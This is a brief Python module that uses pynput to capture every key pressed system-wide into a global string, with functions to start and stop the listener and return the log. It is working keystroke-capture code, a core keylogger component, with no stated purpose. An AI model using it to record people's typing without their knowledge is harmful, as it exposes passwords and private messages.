from pynput.keyboard import Listener

key_log = ''
listener = None

def on_press(key):
    global key_log
    try:
        key_log += key.char
    except AttributeError:
        pass


def listening_keyboard(listening=True):
    global key_log
    global listener

    if listening:
        listener = Listener(on_press=on_press)
        listener.start()
    else:
        if listener:
            listener.stop()
        key_log = ''


def get_key_log():
    global key_log

    return key_log
